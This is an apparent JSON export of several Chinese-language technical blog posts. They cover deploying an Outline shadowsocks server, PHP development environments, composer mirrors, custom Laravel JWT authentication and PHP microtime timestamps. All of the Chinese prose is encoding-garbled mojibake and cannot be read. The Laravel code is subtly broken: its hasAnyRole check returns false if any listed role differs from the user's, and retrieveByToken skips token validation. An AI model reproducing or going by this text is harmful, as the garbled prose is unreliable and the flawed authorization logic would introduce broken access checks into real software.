é…ç½®è„šæœ¬ 123456789#æŸ¥çœ‹å‚æ•°sh install_server.sh -hè¾“å‡º:Usage: install_server.sh [--hostname &lt;hostname&gt;] [--api-port &lt;port&gt;] [--keys-port &lt;port&gt;] --hostname è®¿é—®åŸŸå --api-port APIç®¡ç†ç«¯å£ --keys-port shadowsocksæœåŠ¡ç«¯å£(å…¼å®¹sså®¢æˆ·ç«¯) æ‰§è¡Œå®‰è£… 123456# ç¯å¢ƒéœ€è¦æå‰å®‰è£…dockersh install_server.sh --hostname åŸŸå --api-port 80 --keys-port 443# dockeré•œåƒå®‰è£…quay.io/outline/shadowbox =&gt; å°è£…çš„shadowsocksé•œåƒdocker.io/v2tec/watchtower=&gt; dockerå®¹å™¨ç›‘æ§é•œåƒ é…ç½®è„šæœ¬å®‰è£…å®Œæˆåï¼Œç»ˆç«¯ä¸­ä¼šè¾“å‡ºå¦‚ä¸‹ä¿¡æ¯ã€‚æ³¨æ„apiUlrçš„jsonæ•°æ®, æœåŠ¡ç«¯ç®¡ç†å®¢æˆ·ç«¯éœ€è¦è¿™ä¸ªã€‚ 12345678......To manage your Outline server, please copy the following line (including curlybrackets) into Step 2 of the Outline Manager interface:&#123;&quot;apiUrl&quot;:&quot;https://www.demo.com:33104/pHFagvPGtiprJ4gAVRcSVQ&quot;,&quot;certSha256&quot;:&quot;E71C445A78CF6D37D3959AE190D1E350425D5FB956232228FDEBEDD8CE689CC4&quot;&#125;...... æœåŠ¡ç«¯å®¢æˆ·ç«¯é…ç½®ç²˜è´´ä¸Šè¿°apiUlr jsonå­—ç¬¦åˆ°å®¢æˆ·ç«¯ä¸­å³å¯æ·»åŠ  1* åˆ†äº«é“¾æ¥ä¸­KEYéœ€è¦è§£ç ï¼Œå¤åˆ¶å‡º`ss://`å­—ç¬¦, ä½¿ç”¨&quot;ssåè®®å·¥å…·&quot;è§£å¯† outline serveré…ç½®æ–‡ä»¶(dockerå®¹å™¨) 12345678910åº”ç”¨ç›®å½•: /root/shadowbox /root/shadowbox/bin/outline-ss-server /root/shadowbox/bin/prometheusé…ç½®ç›®å½•: /opt/outline /opt/outline/persisted-state/shadowbox_config.json /opt/outline/persisted-state/shadowbox_server_config.json /opt/outline/persisted-state/outline-ss-server/config.yml 0x2 é¡¹ç›®åˆ†æ outlineè¿™ä¸ªé¡¹ç›®å‰èº«æ˜¯uProxy, outlineé¡¹ç›®ä¸»è¦åˆ†ä¸ºoutline-clientã€outline-serverå’Œoutline-ss-serverä¸‰ä¸ªå·¥ç¨‹ã€‚outline-clienté‡‡ç”¨electronå’Œtypescriptå¼€å‘å®¢æˆ·ç«¯ï¼Œç§»åŠ¨ç«¯é…ç½®ç›¸å¯¹ç®€å•ï¼Œgithubä¸Šæœ‰iOSå®¢æˆ·ç«¯ipaæ–‡ä»¶ã€‚outline-ss-serverå·¥ç¨‹ä½¿ç”¨golangé‡æ–°å®ç°shadowsocksåŠŸèƒ½ï¼Œç›¸å¯¹go-shadowsocks2å¤šäº†ç«¯å£å¤ç”¨å’Œç›‘æ§ä¸ŠæŠ¥åŠŸèƒ½ï¼Œæ›´å¤šè¯¦æƒ…å‚è€ƒå®˜æ–¹è¯´æ˜ã€‚ outlineæ ¸å¿ƒæ˜¯outline-serverå·¥ç¨‹, åŒ…è£…outline-ss-serverä½œä¸ºä¸€ä¸ªæ ¸å¿ƒä»£ç†æœåŠ¡ã€‚ é¡¹ç›®æ¨¡å—: shadowbox 1shadowboxæä¾›outline-ss-serveræœåŠ¡dockeré•œåƒæ„å»ºã€é…ç½®åŠ è½½å’ŒAPIæœåŠ¡å®ç° server_manager 1outlineæœåŠ¡ç«¯ç®¡ç†è½¯ä»¶ï¼Œå’Œoutline-clientç±»å‹éƒ½æ˜¯é‡‡ç”¨electronå®ç°GUIç•Œé¢ï¼Œè°ƒç”¨APIæ¥å£æ“ä½œ sentry_webhook 1æ—¥å¿—æœåŠ¡ä¸ŠæŠ¥ï¼Œåˆ©ç”¨Google cloud functionåŠŸèƒ½é…åˆhttps://sentry.io/outlinevpnå¹³å°ä¸ŠæŠ¥æ•°æ® metrics_server 1å…ƒæ•°æ®ä¸ŠæŠ¥ï¼Œåˆ©ç”¨Google cloud functionåŠŸèƒ½å®ç°æ•°æ®ä¸ŠæŠ¥ã€‚outline-serverå¯ä»¥è®¾ç½®ä¸ŠæŠ¥æ•°æ®å¼€å…³ã€‚å…·ä½“å‚è€ƒshadowbox_server_config.jsoné…ç½®æ–‡ä»¶ã€‚å¦‚æœDockerç¯å¢ƒå˜é‡æœªè®¾ç½®SB_METRICS_URLå€¼ï¼Œç³»ç»Ÿé»˜è®¤ä¸ŠæŠ¥åœ°å€æ˜¯https://metrics-prod.uproxy.org, æ— æ³•é€šè¿‡outline-serverä¿®æ”¹ä¸ŠæŠ¥åœ°å€ã€‚æ•°æ®ä¸ŠæŠ¥ä¹Ÿæ˜¯outlineè¢«è¯Ÿç—…çš„åœ°æ–¹ã€‚ outlineçš„ä¼˜åŠ¿åœ¨äºæ•´ä½“é…ç½®ç®€å•ï¼Œæœ‰è‡ªæˆä¸€ä½“çš„å®¢æˆ·ç«¯å…¨å®¶æ¡¶ï¼Œä½¿ç”¨æ–¹ä¾¿ã€‚ä»æœ¬è´¨ä¸Šæ¥è¯´ï¼Œéƒ½åªæ˜¯åœ¨shadowsocksä¸Šå¥—äº†ä¸€å±‚å£³è€Œå·²ã€‚ 0x3 å‚è€ƒ å®˜æ–¹ä»“åº“ å®˜æ–¹æ–‡æ¡£ æ–°é—»æŠ¥é“ ssåè®®è§£æå·¥å…·","categories":[{"name":"network","slug":"network","permalink":"https://ushell.me/categories/network/"}],"tags":[{"name":"outline","slug":"outline","permalink":"https://ushell.me/tags/outline/"},{"name":"é…¸é…¸ä¹³","slug":"é…¸é…¸ä¹³","permalink":"https://ushell.me/tags/%E9%85%B8%E9%85%B8%E4%B9%B3/"}]},{"title":"PHPæœ¬åœ°å¼€å‘ç¯å¢ƒæµ…æ","slug":"PHPæœ¬åœ°å¼€å‘ç¯å¢ƒæµ…æ","date":"2019-07-07T08:58:36.000Z","updated":"2019-07-07T08:58:36.000Z","comments":true,"path":"2019/07/07/PHPæœ¬åœ°å¼€å‘ç¯å¢ƒæµ…æ/","link":"","permalink":"https://ushell.me/2019/07/07/PHP%E6%9C%AC%E5%9C%B0%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%B5%85%E6%9E%90/","excerpt":"","text":"PHPç”Ÿæ€å‘å±•åå‡ å¹´äº†ï¼Œç›®å‰ä¾æ—§åœ¨ä¸šåŠ¡å¼€å‘è¯­è¨€ä¸­å ä¸€å¸­ä¹‹åœ°ã€‚å¤§éƒ¨åˆ†å…¬å¸ä¸šåŠ¡å¼€å‘éƒ½ä¼šè¦æ±‚ç»Ÿä¸€å¼€å‘é£æ ¼ï¼Œä»¥ä¾¿ä¸šåŠ¡æ›´å¥½çš„è¿­ä»£é‡æ„ã€‚PHPç”±äºæ˜¯è§£é‡Šæ€§è¯­è¨€ï¼Œå‰æœŸå¼€å‘ç¯å¢ƒé…ç½®ç®€å•ï¼›ä¾èµ–çš„æ‰©å±•åŠä¸‰æ–¹æœåŠ¡å¹¶ä¸å¤æ‚ï¼Œä½†éšç€ä¸šåŠ¡çš„å‘å±•ï¼Œå¼•å…¥çš„ä¸‰æ–¹æœåŠ¡ä¸æ–­è¿­ä»£æ›´æ–°å°±ä¼šé€ æˆå¼€å‘äººå‘˜çš„ç¯å¢ƒä¸ç»Ÿä¸€ï¼Œå®¹æ˜“å‡ºç°æœ¬åœ°ç¯å¢ƒæµ‹è¯•æ²¡æœ‰é—®é¢˜ï¼Œä¸€ä¸Šçº¿å°±å‡ºç°å„ç§å¥‡æ€ªçš„é—®é¢˜ã€‚ ç¬”è€…æ€»ç»“ä¸‹ç›®å‰PHPæœ¬åœ°å¼€æ”¾ç¯å¢ƒè¶‹åŠ¿ï¼Œå¤§è‡´æœ‰ä¸‰ç±» #é›†æˆç¯å¢ƒå¼€å‘ä½¿ç”¨è¯¸å¦‚phpstudyã€xamppã€mampç­‰é›†æˆç¯å¢ƒï¼Œè¿™äº›é›†æˆç¯å¢ƒåŸºæœ¬ä¸Šæ»¡è¶³PHPå¼€å‘æ—¥å¸¸ã€‚è¿™ç±»é›†æˆç¯å¢ƒåœ¨ç»Ÿä¸€é…ç½®PHPæ‰©å±•æ¯”è¾ƒéº»çƒ¦ï¼Œå°¤å…¶æ¶‰åŠwindowsç¯å¢ƒæ‰©å±•æ›´åŠ ç¹çã€‚ #phpbrewè‡ªç”±å¼phpbrewæ˜¯ä¸€ä¸ªPHPå¤šç‰ˆæœ¬åŒ…ç®¡ç†è½¯ä»¶ï¼Œæ”¯æŒå¤šç‰ˆæœ¬ï¼Œè‡ªç”±é…ç½®æ‰©å±•ç­‰ä¾¿æ·æ“ä½œã€‚ç¬”è€…æ¯”è¾ƒæ¨èä½¿ç”¨è¿™ç§æ–¹å¼å¼€å‘PHPé¡¹ç›®ï¼Œphpbrewåœ¨mac/linuxç¯å¢ƒä½¿ç”¨åŸºæœ¬æ»¡è¶³éœ€æ±‚ï¼Œwindowså¼€å‘ç¯å¢ƒé…ç½®phpbrewæ¯”è¾ƒéº»çƒ¦ä¸€äº›ã€‚å¾®è½¯è¿™å‡ å¹´æ¨è¿›windows shellç¯å¢ƒçš„ä½¿ç”¨ï¼Œç›¸ä¿¡è¿‡å‡ å¹´ä¸‰ç«¯å¼€å‘ç¯å¢ƒå·®å¼‚æ€§ä¼šé€æ¸ç¼©å°ã€‚ ç¤ºä¾‹: 1234567891011#å®‰è£…ç‰¹å®šç‰ˆæœ¬phpbrew install 7.3.0#è®¾ç½®PHPç‰ˆæœ¬phpbrew use 7.3.0#æ‰©å±•å®‰è£…phpbrew ext install ldap#å…³é—­phpbrewphpbrew off #Laravel homesteadlaravel homesteadæ˜¯laravelå®˜æ–¹å‡ºå“çš„å¼€å‘ç¯å¢ƒæ–¹æ¡ˆï¼Œé€šè¿‡vagrantåŠ è½½é…ç½®æ–‡ä»¶åˆå§‹åŒ–PHPé¡¹ç›®æ‰€éœ€è¦çš„ç¯å¢ƒã€‚vagrantä½¿ç”¨virtualboxç­‰è™šæ‹Ÿæœºæ–¹å¼åŠ è½½laravel/homestead boxé•œåƒçš„æ–¹å¼ç»Ÿä¸€é¡¹ç›®ä¸­ç ”å‘äººå‘˜çš„å¼€å‘ç¯å¢ƒï¼Œè¯¥æ–¹æ¡ˆå±äºç¬¨é‡çš„æ–¹å¼ã€‚boxé•œåƒæ–‡ä»¶æ¯”è¾ƒå¤§ã€éœ€è¦é…ç½®homestead.yamlå’Œéœ€è¦å®‰è£…virtualboxæ²¡æœ‰é‚£ä¹ˆçµæ´»ã€‚ä¼ä¸šçº§å¼€å‘å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ¡ˆï¼Œä¸è¿‡homesteadæ”¯æŒå…¶ä»–æ¡†æ¶ä¹ˆï¼Œå¦‚Yii2/Symfony/CIï¼Ÿ #DockeråŒ–ä¸€åˆ‡æœåŠ¡çš†å¯dockerï¼Ÿéšç€å¾®æœåŠ¡åŒ–ã€k8så’Œäº‘ä¸ŠæœåŠ¡ç­‰æŠ€æœ¯å…´èµ·ï¼Œdockerè¿™ä¸ªå®¹å™¨ä¹Ÿéšä¹‹æˆäº†ç ”å‘äººå‘˜å¸¸å¸¸è®¨è®ºçš„è¯é¢˜ã€‚dockerä¼˜ç‚¹ä¸»è¦åœ¨äºå®¹å™¨åŒ–ã€éš”ç¦»å‹ã€æ˜“äºç®¡ç†å’Œè½»ä¾¿æ€§ä¸ºä¸»ã€‚PHPåœ¨dockerçš„ç”Ÿæ€ç¯é™å‘å±•ä¹Ÿä¸é”™ï¼Œä¸»æµé•œåƒåŸºæœ¬éƒ½æœ‰ã€‚PHPè¿™é‡Œé‡‡ç”¨dockerä¸»è¦å­˜åœ¨ä¸¤ä¸ªæ–¹é¢ï¼šä¸€æ˜¯dockeræ„å»ºä¸šåŠ¡ä»£ç ï¼›äºŒæ˜¯dockeræ„å»ºæœ¬åœ°å¼€å‘çš„ç¯å¢ƒã€‚å‰è€…é€šè¿‡gitlabä¸­çš„ciè„šæœ¬ç»Ÿä¸€æ„å»ºä»£ç è¿è¡Œç¯å¢ƒï¼Œä¾¿äºè¿ç»´ç®¡ç†å‘å¸ƒå›æ»šç­‰æ“ä½œã€‚åè€…ä¸»è¦æ˜¯ä¾¿äºå¼€å‘äººå‘˜æœ¬åœ°æ­å»ºç¯å¢ƒèŠ‚çœå¤§é‡æ—¶é—´ã€‚å¾ˆå¤šæ—¶å€™åªæ˜¯éªŒè¯æŸäº›æœåŠ¡çš„åœºæ™¯ï¼Œæ‰‹åŠ¨æ­å»ºç¯å¢ƒä¼šé‡åˆ°å¾ˆå¤šé—®é¢˜ï¼›æ‰‹åŠ¨æ­å»ºå”¯ä¸€å¥½å¤„å°±æ˜¯å¯ä»¥éå¸¸äº†è§£ç³»ç»Ÿçš„è¿è¡ŒåŠç³»ç»Ÿçš„å®˜æ–¹æ‰‹å†Œ :) laradockæ˜¯PHPé›†æˆç¯å¢ƒdockeråŒ–ä¸€ä¸ªæ–¹æ¡ˆï¼Œé€šè¿‡å†…ç½®å¼€å‘ç¯å¢ƒæ‰€éœ€çš„dockerfileæ–‡ä»¶è¿›è¡Œè‡ªåŠ¨æ„å»ºï¼›è¯¥é¡¹ç›®ç›®å‰githubæ‹¥æœ‰æ˜Ÿæ˜Ÿ7k+çš„çŠ¶æ€ï¼Œä»“åº“å†…ç½®è®¸å¤šæœåŠ¡çš„dockerfileå¯ä»¥ç”¨æ¥å­¦ä¹ æŸäº›æœåŠ¡dockerfileå†™æ³•ï¼Œæ¨èå­¦ä¹ ä¸‹ #ç»“è®º?ç”±äºæ¯ä¸ªäººçš„å–œå¥½ä¸åŒï¼Œå¼€å‘ä¹ æƒ¯ä¹Ÿä¸åŒã€‚å¦‚æœæƒ³è‡ªç”±äº›ï¼Œæ¨èphpbrew+dockerå¼€å‘PHPé¡¹ç›®ï¼›ä¼ä¸šçº§æƒ³å¼ºåˆ¶è§„èŒƒå¼€å‘ç¯å¢ƒå¯ä»¥ä½¿ç”¨homesteadæ–¹æ¡ˆã€‚å¯¹äºwindowsç¯å¢ƒä¸‹çš„å¼€å‘è€…ï¼Œç¬”è€…å»ºè®®ä¸‹è½½virtualboxå®‰è£…debianç¯å¢ƒè¿›è¡Œæ—¥å¸¸å¼€å‘ï¼Œæ¯•ç«Ÿwindowsä¸‹å¼€å‘ä¼šå­˜åœ¨å¾ˆå¤šè¯¡å¼‚é—®é¢˜ã€‚ æˆ–è®¸å‡ å¹´ååˆæµè¡ŒXXæ–¹æ¡ˆå‘¢ï¼Ÿä¸€åˆ‡éƒ½åªæ˜¯è¶‹åŠ¿ä¸‹çš„äº§ç‰© #å‚è€ƒvagrantupæ–‡æ¡£Homesteadæ–‡æ¡£phpbrewä»“åº“laradockæ–‡æ¡£","categories":[{"name":"php","slug":"php","permalink":"https://ushell.me/categories/php/"}],"tags":[{"name":"phpbrew","slug":"phpbrew","permalink":"https://ushell.me/tags/phpbrew/"},{"name":"laradock","slug":"laradock","permalink":"https://ushell.me/tags/laradock/"}]},{"title":"composeråŠ é€Ÿ","slug":"composeråŠ é€Ÿ","date":"2019-07-07T08:00:51.000Z","updated":"2019-07-07T08:00:51.000Z","comments":true,"path":"2019/07/07/composeråŠ é€Ÿ/","link":"","permalink":"https://ushell.me/2019/07/07/composer%E5%8A%A0%E9%80%9F/","excerpt":"","text":"composerå®˜æ–¹åœ¨2020-10-24å‘å¸ƒcomposer2ï¼ŒåŒ…å¤„ç†èƒ½åŠ›æ•´ä½“æå‡ä¸å°‘ï¼›åŒæ—¶prestissimoé¡¹ç›®æ¨èä½¿ç”¨composer2, å¹¶ä¸”æ”¯æŒèŒƒå›´é™å®šåœ¨2.0ä»¥ä¸‹ç‰ˆæœ¬ã€‚å®˜æ–¹åšå®¢ä¸­æåˆ°composer2.xè™½ç„¶æ”¯æŒPHP5.6ç­‰ä½ç‰ˆæœ¬ï¼Œåç»­composer2.xç‰ˆæœ¬ä¼šè¦æ±‚PHPåœ¨7.0ä»¥ä¸Šä¸»æµç‰ˆæœ¬ï¼›æ¨èå‡çº§PHPç‰ˆæœ¬ï¼Œæ¯•ç«ŸPHP8éƒ½å‡ºæ¥äº†ã€‚ composer2å‡çº§: 1composer self-update --2 composer2æ–°å¢runtimeç‰¹æ€§ï¼Œå…¶ä¸­plaform checkåŠŸèƒ½ä¼šæ£€æŸ¥å½“å‰PHPç‰ˆæœ¬ï¼Œå¦‚æœPHPç‰ˆæœ¬ç¬¦åˆåŒ…çš„è¦æ±‚ä¼šæŠ¥é”™ï¼Œå…·ä½“ç‰¹æ€§å‚è€ƒå®˜æ–¹åšå®¢ æ³¨æ„ï¼šé˜¿é‡Œäº‘å’Œè…¾è®¯äº‘composeré•œåƒå­˜åœ¨ä¸€å®šå‡ ç‡å¼‚å¸¸ï¼Œä¼˜å…ˆä½¿ç”¨å®˜æ–¹é•œåƒ composeræ˜¯PHPé¡¹ç›®åŒ…ç®¡ç†åˆ©å™¨ï¼Œç”±äºå¢™çš„åŸå› å¯¼è‡´åŒ…ä¸‹è½½é€Ÿåº¦ç¼“æ…¢ï¼›composerå…¨é‡é•œåƒä¸»è¦æœ‰phpcomposerã€laravel-chinaå’Œæ–°å¼€æ”¾çš„é˜¿é‡Œäº‘ã€‚é˜¿é‡Œäº‘æœ€è¿‘å¼€æ”¾composeré•œåƒä»“åº“ï¼Œå¤§å¤§å‡å°‘åŒ…ä¸‹è½½çš„é€Ÿåº¦ã€‚ç¬”è€…æ¨èé˜¿é‡Œäº‘+prestissimoç»„åˆæ–¹å¼ã€‚ è…¾è®¯äº‘ä¹Ÿè·Ÿéšé˜¿é‡Œçš„è„šæ­¥å¼€æ”¾composerå…¨é‡é•œåƒä»“åº“, å®˜ç½‘é…ç½®, é˜¿é‡Œçš„composerå¶å°”ä¹Ÿä¼šæŠ½ç­‹ï¼Œå¯èƒ½ä¸æœ¬åœ°ç½‘ç»œæœ‰å…³ :) laravel-chinaå…¨é‡é•œåƒä»“åº“å°†ä¼šåœ¨ä¸¤ä¸ªæœˆå·¦å³å…³é—­ï¼Œå…·ä½“ç§»æ­¥é˜…è¯»ã€‚ #é˜¿é‡Œäº‘composeré…ç½®1234å…¨å±€å®‰è£…(æ¨è): composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/å–æ¶ˆé…ç½®: composer config -g --unset repos.packagist è¿™é‡Œä½¿ç”¨composerä¸‹è½½åŒ…æ—¶ä½¿ç”¨-vvvå‚æ•°æ˜¾ç¤ºè¿›åº¦è¯¦æƒ…ï¼Œèƒ½æœ‰æœ‰ä¸€ä¸ªç›´è§‚çš„ä½“ç°ã€‚ #prestissimoå¹¶å‘åŠ é€Ÿprestissimoæ˜¯ä¸€ä¸ªå¹¶å‘ä¸‹è½½çš„composeræ’ä»¶ï¼Œé€šè¿‡ä½¿ç”¨curl_multi*ç³»åˆ—æ–¹æ³•å¹¶å‘è¯·æ±‚åŒ…ï¼Œä¸€å®šç¨‹åº¦èŠ‚çº¦æ—¶é—´ã€‚ 12å®‰è£…: composer global require hirak/prestissimoå¸è½½: composer global remove hirak/prestissimo #å‚è€ƒ: prestissimoä»“åº“ é˜¿é‡Œäº‘Composerå…¨é‡é•œåƒ è…¾è®¯äº‘Composerå…¨é‡é•œåƒ composer2","categories":[{"name":"tools","slug":"tools","permalink":"https://ushell.me/categories/tools/"}],"tags":[{"name":"composer","slug":"composer","permalink":"https://ushell.me/tags/composer/"},{"name":"prestissimo","slug":"prestissimo","permalink":"https://ushell.me/tags/prestissimo/"},{"name":"composer2","slug":"composer2","permalink":"https://ushell.me/tags/composer2/"}]},{"title":"laravelè‡ªå®šä¹‰è®¤è¯","slug":"laravelè‡ªå®šä¹‰è®¤è¯","date":"2019-06-01T16:00:00.000Z","updated":"2019-06-01T16:00:00.000Z","comments":true,"path":"2019/06/02/laravelè‡ªå®šä¹‰è®¤è¯/","link":"","permalink":"https://ushell.me/2019/06/02/laravel%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%A4%E8%AF%81/","excerpt":"","text":"laravelè‡ªå¸¦ç”¨æˆ·è®¤è¯åŸºæœ¬æ»¡è¶³ç®€å•ä¸šåŠ¡éœ€æ±‚ï¼Œå¦‚æœè¦å¼€å‘APIæ¥å£åˆ™éœ€è¦å¼•å…¥jwtè®¤è¯ç»„ä»¶ã€‚jwtç»„ä»¶çš„é…ç½®å‚è€ƒJWT å®Œæ•´ä½¿ç”¨è¯¦è§£, æœ¬æ–‡ä¸»è¦è®°å½•ä¸‹å›´ç»•APIä¸JWTè®¤è¯ä¸€äº›ä½¿ç”¨æŠ€å·§ã€‚ 0x1 è‡ªå®šä¹‰è®¤è¯å¦‚æœç”¨æˆ·è®¤è¯ä½¿ç”¨ä¸€äº›ä¸‰æ–¹çš„è®¤è¯æœåŠ¡ï¼Œåº”è¯¥å¦‚ä½•å¤„ç†å‘¢ï¼ŸLaravelæä¾›è‡ªå®šä¹‰çš„è®¤è¯çš„å…¥å£ï¼Œé€šè¿‡Providerå½¢å¼æ›¿ä»£åŸæœ‰çš„è®¤è¯é€»è¾‘ã€‚ æ³¨å†Œè‡ªå®šä¹‰è®¤è¯æ–¹æ³•: 123456789101112131415161718192021#app/Providers/AuthServiceProvider.phpclass AuthServiceProvider extends ServiceProvider&#123; //çœç•¥... /** * Register any authentication / authorization services. * * @return void */ public function boot() &#123; $this-&gt;registerPolicies(); //æ³¨å†ŒDIYUserServiceProvider Auth::provider(&quot;DIY&quot;, function($app, array $config)&#123; return new DIYUserServiceProvider($app); &#125;); &#125;&#125; ä¿®å¤é…ç½®: 123456#config/auth.php &#x27;providers&#x27; =&gt; [ &#x27;users&#x27; =&gt; [ &#x27;driver&#x27; =&gt; &#x27;DIY&#x27;, ], ], ç”Ÿæˆprovideræ–‡ä»¶ 1php artisan make:provider DIYUserServiceProvider å®ç°DIYUserServiceProvideræ–¹æ³•: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#app/Providers/DIYUserServiceProvider.php&lt;?phpnamespace App\\Providers;use Illuminate\\Contracts\\Auth\\UserProvider;use Illuminate\\Support\\ServiceProvider;use Illuminate\\Contracts\\Auth\\Authenticatable as UserContract;use App\\User;use App\\Services\\DIYUserService;class DIYUserServiceProvider extends ServiceProvider implements UserProvider&#123; /** * Retrieve a user by their unique identifier. * * @param mixed $identifier * @return \\Illuminate\\Contracts\\Auth\\Authenticatable|null */ public function retrieveById($identifier) &#123; // æ ¹æ®è®¤è¯ä¿¡æ¯è·å–ç”¨æˆ·ä¿¡æ¯ $user = []; //App\\Userå¯¹è±¡å¢åŠ Modelå±æ€§attributes return new User([&#x27;attributes&#x27; =&gt; $user]); &#125; /** * Retrieve a user by their unique identifier and &quot;remember me&quot; token. * * @param mixed $identifier * @param string $token * @return \\Illuminate\\Contracts\\Auth\\Authenticatable|null */ public function retrieveByToken($identifier, $token) &#123; return new User($identifier); &#125; /** * Update the &quot;remember me&quot; token for the given user in storage. * * @param \\Illuminate\\Contracts\\Auth\\Authenticatable $user * @param string $token * @return void */ public function updateRememberToken(UserContract $user, $credentials) &#123; &#125; /** * Retrieve a user by the given credentials. * * @param array $credentials * @return \\Illuminate\\Contracts\\Auth\\Authenticatable|null */ public function retrieveByCredentials(array $credentials) &#123; $user = new User($credentials); return $user; &#125; /** * Validate a user against the given credentials. * * @param \\Illuminate\\Contracts\\Auth\\Authenticatable $user * @param array $credentials * @return bool */ public function validateCredentials(UserContract $user, array $credentials) &#123; $username = $credentials[&#x27;email&#x27;]; $password = $credentials[&#x27;password&#x27;]; // å®ç°ç”¨æˆ·è®¤è¯ return DIYUserService::auth($username, $password); &#125;&#125; Useræ¨¡å‹è®¤è¯æ–¹æ³•è°ƒç”¨è¿‡ç¨‹ä¸­éƒ½ä¼šä½¿ç”¨åˆ°App\\Userè¿™ä¸ªç±»æ–‡ä»¶ï¼Œjwtåœ¨è¿™ä¸ªç±»ä¸­å¢åŠ getJWTIdentifierå’ŒgetJWTCustomClaimsæ–¹æ³•ã€‚DIYUserServiceProvideræ–¹æ³•éœ€è¦å°†éƒ¨åˆ†è®¤è¯ä¿¡æ¯èµ‹äºˆåˆ°Userç±»ã€‚åœ¨åç»­ä½¿ç”¨Laravel-permissionç»„ä»¶æ—¶ä¹Ÿéœ€è¦å¢åŠ ç‰¹å®šæ–¹æ³•ã€‚ 0x2 APIé‰´æƒä¸šåŠ¡æ¨¡å—ä¸åŒï¼Œç”¨æˆ·è§’è‰²ä¸åŒå¯ä»¥é€šè¿‡laravel-permissionæƒé™ç»„ä»¶å®Œæˆå¯¹ç”¨æˆ·æ¥å£è°ƒç”¨æƒé™çš„è¯†åˆ«ã€‚laravel-permissionç»„ä»¶æ˜¯entrustç»„ä»¶çš„æ›¿ä»£å“ï¼Œä¹Ÿæ˜¯é€šè¿‡roleã€permissionå’Œmodelå¯¹ç”¨æˆ·æƒé™æ§åˆ¶ã€‚ laravel-permissionç»„ä»¶: åŸºç¡€ä½¿ç”¨12345678#åˆ›å»ºè§’è‰²ã€æƒé™$role = Role::create([&#x27;name&#x27; =&gt; &#x27;admin&#x27;]);$permissions = [ Permission::create([&#x27;name&#x27; =&gt; &#x27;user-manage&#x27;]), Permission::create([&#x27;name&#x27; =&gt; &#x27;role-manage&#x27;]),];$role-&gt;syncPermissions($permissions); APIé™åˆ¶123456789101112131415161718192021#è·¯ç”±é…ç½®Route::group([&#x27;middleware&#x27; =&gt; &#x27;role:admin&#x27;], function () &#123; //...&#125;);#Userç±»å®ç°åˆ¤æ–­æ–¹æ³•(App\\User.php)#è¯¥æ–¹æ³•éœ€è¦å•ç‹¬æ·»åŠ , v5.8ç‰ˆæœ¬ä¸­æ²¡æœ‰hasAnyRoleè¯¥æ–¹æ³•public function hasAnyRole($roles)&#123; $user = $this-&gt;getAttribute(&#x27;attributes&#x27;); foreach ($roles as $role) &#123; if ($role !== $user[&#x27;roles&#x27;]) &#123; return false; &#125; &#125; return true;&#125; 0x3 æ€»ç»“laravelçš„ç”Ÿæ€ç³»ç»Ÿä¸°å¯Œï¼Œå„ç§å„æ ·ç»„ä»¶éƒ½å­˜åœ¨ï¼›ä½¿ç”¨ä¸åŒçš„ç»„ä»¶æ’åˆ—ç»„åˆå®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œè™½ç„¶laravelå·ç§°æœ€ä¼˜é›…çš„æ¡†æ¶ï¼Œä½†æ˜¯å†…éƒ¨é€»è¾‘å¤æ‚éš¾æ‡‚ã€‚ æœ¬æ–‡ç”±äºç¬”è€…èƒ½åŠ›æœ‰é™ï¼Œä¸è¶³ä¹‹å¤„æ¬¢è¿ç•™è¨€æ¢è®¨ã€‚ 0x4 å‚è€ƒlaravelç”¨æˆ·è®¤è¯æ–‡æ¡£laravel-permissionæ–‡æ¡£","categories":[{"name":"php","slug":"php","permalink":"https://ushell.me/categories/php/"}],"tags":[{"name":"laravel","slug":"laravel","permalink":"https://ushell.me/tags/laravel/"},{"name":"jwt","slug":"jwt","permalink":"https://ushell.me/tags/jwt/"},{"name":"laravel-permission","slug":"laravel-permission","permalink":"https://ushell.me/tags/laravel-permission/"}]},{"title":"microtimeæ¯«ç§’æ—¶é—´æˆ³é™·é˜±","slug":"microtimeæ¯«ç§’æ—¶é—´æˆ³é™·é˜±","date":"2019-05-30T06:48:48.000Z","updated":"2019-05-30T06:48:48.000Z","comments":true,"path":"2019/05/30/microtimeæ¯«ç§’æ—¶é—´æˆ³é™·é˜±/","link":"","permalink":"https://ushell.me/2019/05/30/microtime%E6%AF%AB%E7%A7%92%E6%97%B6%E9%97%B4%E6%88%B3%E9%99%B7%E9%98%B1/","excerpt":"","text":"æ¯«ç§’æ—¶é—´æˆ³æ˜¯APIå¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨çš„ä¸€ç§æ—¶é—´æ ¼å¼ï¼ŒPHPè¯­è¨€é€šè¿‡microtimeå‡½æ•°è·å–æœºå™¨çš„æ—¶é—´æˆ³ï¼›microtimeå‡½æ•°åº•å±‚ä¾èµ–Cè¯­è¨€çš„gettimeofdayå‡½æ•°è·å–æ•°æ®ã€‚æ¯«ç§’æ—¶é—´æˆ³æ˜¯ä¸€ä¸ª13ä½é•¿åº¦çš„æ•´å‹æ•°æ®ã€‚ç”±äºPHPè¯­è¨€ç‰¹æ€§ï¼Œmictotimeæ¯«ç§’éƒ¨åˆ†é•¿åº¦ä¸å›ºå®šï¼Œçœç•¥äº†0çš„éƒ¨åˆ†ï¼Œé”™è¯¯çš„ä½¿ç”¨ä¼šå¯¼è‡´è·å–çš„æ¯«ç§’æ—¶é—´æˆ³é•¿åº¦å¼‚å¸¸ã€‚ #æ—¶é—´è½¬æ¢ç§‘æ™® æ¯«ç§’ (ms) 121ç§’ = 1000æ¯«ç§’1æ¯«ç§’ = 0.001ç§’ å¾®ç§’ (us) 121ç§’ = 1000000å¾®ç§’1æ¯«ç§’ = 1000å¾®ç§’ #æ¯«ç§’æ—¶é—´æˆ³ ç¤ºä¾‹ä»£ç  123456789$time = explode(&quot;.&quot;, microtime(true));//å¤„ç†æ¯«ç§’éƒ¨åˆ†$time[0] = $time[0] * 1000;$microtime = $time[0] + substr($time[1], 0, 3);echo intval($microtime); //è¾“å‡º: 1559197645889 